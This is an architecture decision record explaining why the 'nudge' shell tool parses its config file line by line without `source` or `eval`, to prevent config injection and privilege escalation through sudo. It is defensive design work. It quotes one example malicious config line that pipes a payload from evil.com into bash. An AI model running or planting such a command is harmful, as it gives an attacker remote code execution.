# ADR-001: Line-by-line config parser instead of `source`

**Status:** Accepted
**Date:** 2026-03-19
**Decision Makers:** Jay (otmof-ops)

## Context

nudge reads user configuration from `~/.config/nudge/nudge.conf`. The two common approaches for shell-based config files are:

1. **`source` / `.`** — Treat the config as a bash script and execute it.
2. **Line-by-line parser** — Read KEY=VALUE pairs manually with regex matching.

Option 1 is simpler (one line of code) but allows arbitrary code execution. A crafted config file — whether placed by a compromised tool, a malicious dotfile manager, or a user copy-pasting from an untrusted source — would execute with the privileges of the nudge process. Since nudge subsequently runs `sudo` for package upgrades, this creates a local privilege escalation vector.

## Decision

Use a safe line-by-line parser (`config_load()` in `lib/config.sh`) that:

- Reads each line individually
- Matches `^([A-Z_]+)=(.*)$` via bash regex
- Strips surrounding quotes
- Validates against a type system (bool, int, enum, string)
- Assigns via `printf -v "$key" '%s' "$value"` (safe — no eval)
- Rejects unknown keys with a warning

**No `source`, `eval`, or `declare -g "$key=$value"` is used anywhere in config parsing.**

## Consequences

- **Positive:** Eliminates config injection as an attack vector. A malicious config line like `UPDATE_COMMAND="$(curl evil.com/payload | bash)"` is treated as a literal string value and then rejected by UPDATE_COMMAND validation.
- **Positive:** Type validation catches typos and invalid values at load time.
- **Negative:** More code to maintain than a one-line `source`. ~60 lines for the parser vs. 1 line.
- **Negative:** Config file syntax is more restrictive — no inline comments after values, no multi-line values.

## Risk if Reversed

Future maintainers might simplify config loading to `source "$config_file"` without understanding the security rationale. This would silently re-introduce arbitrary code execution via config files — a critical vulnerability given that nudge runs privileged commands.

**This decision MUST NOT be reversed without a full security review.**
